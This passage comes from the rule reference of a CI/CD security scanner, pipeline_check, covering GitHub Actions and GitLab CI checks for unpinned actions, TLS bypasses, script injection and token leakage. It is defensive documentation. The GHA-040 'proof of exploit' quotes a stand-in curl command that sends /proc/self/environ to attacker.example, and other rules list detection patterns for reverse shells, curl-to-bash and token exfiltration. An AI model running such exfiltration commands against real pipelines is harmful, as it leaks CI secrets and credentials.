
**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GHA-022`](../providers/github.md#gha-022) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-023`](../providers/github.md#gha-023) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-024 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves ``who`` published it; a provenance attestation proves ``where/how`` it was built. Consumers can then verify the build happened on a trusted runner, from a specific source commit, with known parameters. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee.

**Recommendation.** Call ``slsa-framework/slsa-github-generator`` or ``actions/attest-build-provenance`` after the build step to emit an in-toto attestation alongside the artifact. ``cosign sign`` alone (covered by GHA-006) signs the artifact but doesn't record *how* it was built. SLSA Build L3 requires the provenance statement.

**Source:** [`GHA-024`](../providers/github.md#gha-024) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-025`: Reusable workflow not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-025 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.

**Recommendation.** Pin every ``jobs.<id>.uses:`` reference to a 40-char commit SHA (``owner/repo/.github/workflows/foo.yml@<sha>``). Tag refs (``@v1``, ``@main``) can be silently repointed by whoever controls the callee repository.

**Source:** [`GHA-025`](../providers/github.md#gha-025) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-026`: Container job disables isolation via `options:` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-026 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** GitHub-hosted runners execute ``container:`` jobs inside a Docker container the runner itself manages, normally a hardened, network-namespaced sandbox. ``options:`` is a free-text passthrough to ``docker run``; a flag that breaks the sandbox (shares host network/PID, runs privileged, maps the Docker socket) turns the job into an RCE on the runner VM.

**Recommendation.** Remove ``--network host``, ``--privileged``, ``--cap-add``, ``--user 0``/``--user root``, ``--pid host``, ``--ipc host``, and host ``-v`` bind-mounts from ``container.options`` and ``services.*.options``. If a build genuinely needs one of these, move it to a dedicated self-hosted pool with branch protection so the flag doesn't reach PR runs.

**Source:** [`GHA-026`](../providers/github.md#gha-026) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-027`: Workflow contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-027 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Distinct from the hygiene checks. GHA-016 flags ``curl | bash`` as a risky default; this rule fires only on concrete indicators, reverse shells, base64-decoded execution, known miner binaries or pool URLs, exfil-channel domains, credential-dump pipes, history-erasure commands. Categories reported: ``obfuscated-exec``, ``reverse-shell``, ``crypto-miner``, ``exfil-channel``, ``credential-exfil``, ``audit-erasure``.

**Recommendation.** Treat this as a potential pipeline compromise. Inspect the matching step(s), identify the author and the PR that introduced them, rotate any credentials the workflow has access to, and audit CloudTrail/AuditLogs for exfil. If the match is a legitimate red-team exercise, whitelist via ``.pipelinecheckignore`` with an ``expires:`` date, never a permanent suppression.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-028`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-028 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. If the value contains ``;``, ``&&``, ``|``, backticks, or ``$()``, those metacharacters execute. Even when the variable source looks controlled today, relocating the script or adding a new caller can silently expose it to untrusted input.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command really must be dynamic, pass arguments as array members (``"${ARGS[@]}"``) or validate the input against an allow-list before invocation.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool> <literal-args>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd. The rule only fires when the substituted command references a variable.

**Source:** [`GHA-028`](../providers/github.md#gha-028) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Package installs that pull from ``git+…`` without a pinned commit, from a local path (``./dir``, ``file:…``, absolute paths), or from a direct tarball URL are invisible to the normal lockfile integrity controls. A moving branch head, a sibling checkout the build assumes exists, or a tarball whose hash isn't verified all give an attacker who controls any of those surfaces the ability to substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GHA-029`](../providers/github.md#gha-029) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-037`: actions/checkout persists GITHUB_TOKEN into .git/config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-037 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detection fires on any step whose ``uses:`` starts with ``actions/checkout@`` and whose ``with:`` block either omits ``persist-credentials`` (the unsafe default) or sets it to ``true`` explicitly.

This is the failure pattern Zizmor calls *Artipacked* and the StepSecurity / harden-runner audit set tracks as ``persist-credentials``-default. Real-world exploit chains (the ``ultralytics`` 2024 RCE, multiple Mend / Snyk advisories) exploit exactly this primitive: a first checkout step persists the token, a later ``run:`` step (often a build script the attacker can influence via PR contents) reads ``.git/config`` and ships the token out.

Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; GHA-037 catches the implicit checkout-default that doesn't go through a ``run:`` line at all.

**Recommendation.** Set ``persist-credentials: false`` on every ``actions/checkout`` step that doesn't need to push back to the repo. The default in v3 / v4 is ``true``, which writes the GITHUB_TOKEN into ``.git/config`` as an ``http.https://github.com/.extraheader`` line. Any subsequent ``run:`` step in the same job can read it with ``git config --get http.https://github.com/.extraheader`` and exfiltrate the token to a remote endpoint, even if that step's own scope is read-only. If the workflow genuinely needs to push (release publishing, doc-site deploys), do the push as the very next step and immediately follow with a checkout that sets ``persist-credentials: false`` so the token doesn't leak into later, less-trusted steps.

**Known false positives.**

- Workflows that genuinely need ``persist-credentials: true`` to push back to the repo (a release-tag bot, a docs-deploy job, ``stefanzweifel/git-auto-commit-action``) shouldn't suppress this rule globally; instead, scope ``persist-credentials: true`` to a named step, then run the push immediately, then use a fresh ``actions/checkout`` with ``persist-credentials: false`` so the token doesn't leak into later steps. Suppress on the specific step name only when the scoped pattern is in place.

**Source:** [`GHA-037`](../providers/github.md#gha-037) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-038`: Workflow re-enables retired ::set-env / ::add-path commands <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-038 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detection fires when ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` is set to any truthy value at the workflow ``env:`` level, the job ``env:`` level, or any step's ``env:`` block. Accepted truthy spellings: ``true`` / ``1`` / ``yes`` / ``on`` (including quoted forms like ``"true"`` and case-insensitive variants like ``YES`` / ``On``).

Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::`` in step scripts. GHA-038 catches the explicit re-enable flag, which is the strictly worse case: it implicitly accepts every ``::set-env::`` / ``::add-path::`` line that lands on the runner's stdout from any tool the step invokes, not just the workflow author's own ``echo`` commands. A downloaded build log, a container's startup banner, an upstream test runner's output, all become injection vectors.

**Recommendation.** Drop the ``ACTIONS_ALLOW_UNSECURE_COMMANDS`` env definition entirely, then migrate any leftover ``::set-env::`` / ``::add-path::`` workflow commands to the file-redirect form (``echo "X=$VAL" >> "$GITHUB_ENV"`` and ``echo "$DIR" >> "$GITHUB_PATH"``). GitHub disabled the legacy commands in 2020 specifically because they share the runner's stdout as a control channel: any log line starting with ``::`` could inject environment variables, prepend to PATH, or set step outputs. Setting the override flag back to ``true`` re-opens that injection channel for the entire workflow scope.

**Known false positives.**

- Some legacy actions (last-updated pre-2020) still emit ``::set-env::`` lines and rely on the override to be set. Replace the action rather than suppressing this rule, the security exposure outweighs the cost of an alternative action.

**Source:** [`GHA-038`](../providers/github.md#gha-038) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-039`: services / container credentials embedded as literal in workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-039 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** GitHub Actions accepts a ``credentials:`` map on both the job-level ``container:`` block (the runner image) and on each ``services.<name>:`` entry (sidecar containers). The map is the documented way to pull a private image from a registry that requires auth, and it expects ``${{ secrets.* }}`` references for both fields.

GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, Slack tokens, etc.) but doesn't trip on a plain password like ``hunter2`` or a registry username like ``ci-deploy-bot``. GHA-039 catches them by **position**: any literal value in a ``credentials.username`` / ``credentials.password`` field is by definition a leaked credential, regardless of its shape. Closes parity with Zizmor's ``hardcoded-container-credentials`` rule.

**Recommendation.** Move every ``services.<name>.credentials.username`` / ``credentials.password`` value (and the same field on a job-level ``container:`` block) out of the workflow YAML and into a repository or environment secret. Reference the secret via ``${{ secrets.NAME }}`` from the same credentials block. Anything written as a literal is permanently visible in every fork of the repo, every build log that prints the runner's start banner, and every cached job summary, so the credential must be treated as compromised on the spot. The fix is the rotation, plus the secret reference, plus a check that no other workflow keeps the literal pattern.

**Known false positives.**

- Workflows that legitimately use a public anonymous registry mirror occasionally hardcode ``username: anonymous`` / ``password: ""`` for clarity. Both shapes are filtered out automatically (empty / whitespace-only values, plus the literal ``anonymous`` username), but if your fixture uses another sentinel for anonymous access, suppress the specific job/service in the ignore-file rather than the rule globally.

**Source:** [`GHA-039`](../providers/github.md#gha-039) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-040`: Action reference matches a known-compromised SHA or tag <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-040 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Walks every workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references against the curated compromised-action registry in ``pipeline_check.core.checks.github._compromised_actions``. Match is case-insensitive on owner / repo and exact on the ``ref`` value (commit SHA or tag name). Registry is deliberately small and append-only — refresh by PR with the citing advisory in the commit message; no fetch-from-network registry to avoid taking on a telemetry surface.

**Recommendation.** Rotate every secret that may have been reachable to a workflow run that hit the compromised reference, then update the ``uses:`` reference to a known-clean SHA published by the upstream maintainer post-incident (usually announced in the advisory body). Audit CI logs for the affected window for any sign that the malicious payload ran against this repo.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing CVE / GHSA exists. Pair with GHA-001 (SHA pinning) and GHA-025 (tag-rewrite detection) for the prevention angle.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): the canonical case the registry was built for. Roughly 23,000 tag-pinned repos shipped CI secrets to an exfiltration endpoint over a ~24-hour window before GitHub blocked the malicious commits.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week as tj-actions; smaller blast radius but identical mechanism. Tag-pinned consumers were affected; SHA-pinned consumers who happened to match the malicious commit were also affected.

**Proof of exploit.**

# Vulnerable: pinned to a SHA the attacker landed under @v45.
# (Substitute the actual malicious-commit SHA from the CVE-2025-30066
# advisory; the registry in _compromised_actions.py carries it.)
- uses: tj-actions/changed-files@<advisory-malicious-sha>

# Same applies to tag pins that resolved to the malicious
# commit during the compromise window:
- uses: tj-actions/changed-files@v45     # WAS pointing at the bad commit

# Attack: the injected action body exfiltrated CI secrets by
# dumping the runner process environment to a controlled host:
#   curl -X POST https://attacker.example/exfil \
#     -d "$(cat /proc/self/environ)"
#
# Every workflow run that hit one of those refs over the
# compromise window leaked the entire env block, including
# ${{ secrets.* }} and GITHUB_TOKEN.

# Safe: pin to the post-incident clean SHA the maintainer
# republished in the advisory (consult the GHSA the registry
# cites for the exact value):
- uses: tj-actions/changed-files@<advisory-clean-sha>

**Source:** [`GHA-040`](../providers/github.md#gha-040) in the [GitHub Actions provider](../providers/github.md).

#### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Floating tags (`latest` or major-only) can be silently swapped under the job. Every `image:` reference should pin a specific version tag or digest.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag (e.g. `python:3.12.1-slim`). Avoid `:latest` and bare tags like `:3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** CI_COMMIT_MESSAGE / CI_COMMIT_REF_NAME / CI_MERGE_REQUEST_TITLE and friends are populated from SCM event metadata the attacker controls. Interpolating them into a shell body executes the crafted content as part of the build.

**Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.

**Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Scans `variables:` at the top level and on each job for entries whose KEY looks credential-shaped and whose VALUE is a literal string (not a `$VAR` reference). AWS access keys are detected by value pattern regardless of key name.

**Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.

**Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** A job whose stage or name contains `deploy` / `release` / `publish` / `promote` should either require manual approval or declare an `environment:` binding. Otherwise any push to the trigger branch ships to the target.

**Recommendation.** Add `when: manual` (optionally with `rules:` for protected branches) or bind the job to an `environment:` with a deployment tier so approvals and audit are enforced by GitLab's environment controls.

**Source:** [`GL-004`](../providers/gitlab.md#gl-004) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-005`: include: pulls remote / project without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-005 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.

**Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.

**Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Unsigned artifacts can't be verified downstream, so a tampered build is indistinguishable from a legitimate one. Pass when any of cosign / sigstore / slsa-* / notation-sign appears in the pipeline text.

**Recommendation.** Add a job that runs `cosign sign` (keyless OIDC with GitLab's id_tokens works out of the box) or `notation sign`. Publish the signature next to the artifact and verify it on consume.

**Source:** [`GL-006`](../providers/gitlab.md#gl-006) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / spdx-sbom-generator / sbom-tool / Trivy-SBOM appears in the pipeline body.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or GitLab's built-in CycloneDX dependency-scanning template. Attach the SBOM as a pipeline artifact.

**Source:** [`GL-007`](../providers/gitlab.md#gl-007) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Complements GL-003 (which looks at `variables:` block keys). GL-008 scans every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into `script:` bodies or environment blocks where the name-based detector can't see them.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a protected + masked CI/CD variable and reference it by name. For cloud access prefer short-lived OIDC tokens.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`GL-008`](../providers/gitlab.md#gl-008) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-009`: Image pinned to version tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-gl-009 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** GL-001 fails floating tags at HIGH; GL-009 is the stricter tier. Even immutable-looking version tags (`python:3.12.1`) can be repointed by registry operators. Digest pins are the only tamper-evident form.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and replace the tag with `@sha256:<digest>`. Automate refreshes with Renovate.

**Source:** [`GL-009`](../providers/gitlab.md#gl-009) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-011`: include: local file pulled in MR-triggered pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-011 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `include: local: '<path>'` resolves from the current pipeline's checked-out tree. On an MR pipeline the tree is the MR source branch, the MR author controls the included YAML content.

**Recommendation.** Move the included template into a separate, read-only project and reference it via `include: project: ... ref: <sha-or-tag>`. That way the included content is fixed at MR creation time and not editable from the MR branch.

**Source:** [`GL-011`](../providers/gitlab.md#gl-011) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-012`: Cache key derives from MR-controlled CI variable <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-012 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** GitLab caches restore by key prefix. When the key includes an MR-controlled variable, an attacker can poison a cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the MR can't control: lockfile contents (`files: [Cargo.lock]`), the job name, and `$CI_PROJECT_NAMESPACE`. Never reference `$CI_MERGE_REQUEST_*` or `$CI_COMMIT_BRANCH` from a cache key namespace.

**Source:** [`GL-012`](../providers/gitlab.md#gl-012) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-013`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-013 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in CI/CD variables can't be rotated on a fine-grained schedule. GitLab supports OIDC via `id_tokens:` for short-lived credential injection.

**Recommendation.** Use GitLab CI/CD OIDC with `id_tokens:` to obtain short-lived AWS credentials via `sts:AssumeRoleWithWebIdentity`. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from CI/CD variables.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-013`](../providers/gitlab.md#gl-013) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-016 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`GL-016`](../providers/gitlab.md#gl-016) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-019`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-019 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GL-019`](../providers/gitlab.md#gl-019) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-020`: CI_JOB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-020 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detects patterns where `CI_JOB_TOKEN` is redirected to a file, piped through `tee`, or appended to dotenv/artifact paths. Persisted tokens survive the job boundary and can be read by later stages, downloaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

**Recommendation.** Never write CI_JOB_TOKEN to files, artifacts, or dotenv reports. Use the token inline in the command that needs it and let GitLab revoke it automatically when the job finishes.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-020`](../providers/gitlab.md#gl-020) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-021`](../providers/gitlab.md#gl-021) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

